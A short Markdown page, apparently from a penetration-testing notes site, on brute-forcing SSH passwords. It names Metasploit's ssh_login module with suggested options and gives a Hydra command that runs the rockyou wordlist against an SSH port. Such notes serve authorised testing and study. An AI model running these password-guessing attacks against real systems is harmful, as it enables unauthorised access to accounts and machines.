---
title: SSH
parent: Other Passwords
layout: default
nav_order: 2
---

1. Fire up `msfconsole`, search `ssh_login`. Enter `info` to see all options. Recommended: set `stoponsuccess` and `verbose` to be true.
2. Hydra:\
   `hydra -l username -P /usr/share/seclists/rockyou.txt -s PORT ssh://127.0.0.1`